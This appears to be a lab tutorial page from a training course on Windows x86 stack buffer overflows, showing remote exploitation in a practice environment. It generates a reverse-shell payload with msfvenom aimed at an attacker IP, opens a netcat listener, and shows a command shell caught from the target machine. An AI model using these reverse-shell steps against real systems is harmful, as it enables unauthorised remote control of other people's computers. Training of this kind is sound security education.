<!--
 // Platform: Academy
// URL: https://academy.hackthebox.com/module/89/section/952
// Platform Version: V1
// Module ID: 89
// Module Name: Stack-Based Buffer Overflows on Windows x86
// Module Difficulty: Medium
// Section ID: 952
// Section Title: Remote Exploitation
// Page Title: Hack The Box - Academy
// Page Number: 10
-->

# Remote Exploitation

**Module Name:** Stack-Based Buffer Overflows on Windows x86 **Page Number:** 10

#### 

#### STACK-BASED BUFFER OVERFLOWS ON WINDOWS X86

# Remote Exploitation

## Reverse Shell Shellcode

``` shell-session
[!bash!]$ ip -4 a

1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
    ...SNIP...
2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc pfifo_fast state UP group default qlen 1000
    ...SNIP...
3: eth1: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc pfifo_fast state UP group default qlen 1000
    ...SNIP...
5: tun0: <POINTOPOINT,MULTICAST,NOARP,UP,LOWER_UP> mtu 1500 qdisc pfifo_fast state UNKNOWN group default qlen 100
    inet 10.10.15.10/23 brd 10.10.15.255 scope global tun0
```

``` shell-session
[!bash!]$ msfvenom -p 'windows/shell_reverse_tcp' LHOST=10.10.15.10 LPORT=1234 -f 'python'

...SNIP...
buf =  b""
buf += b"\xfc\xe8\x82\x00\x00\x00\x60\x89\xe5\x31\xc0\x64\x8b"
...SNIP...
```

## Remote Exploitation

``` shell-session
[!bash!]$ nc -lvnp 1234

listening on [any] 1234 ...
```

``` shell-session
[!bash!]$ nc -lvnp 1234

listening on [any] 1234 ...
connect to [10.10.15.10] from (UNKNOWN) [10.10.10.10] 64539
Microsoft Windows [Version 10.0.19042.928]
(c) Microsoft Corporation. All rights reserved.

C:\Users\htb-student\AppData\Local\Programs\CloudMe\CloudMe>whoami
whoami
htb-student
```

# 

# 

#### Questions

####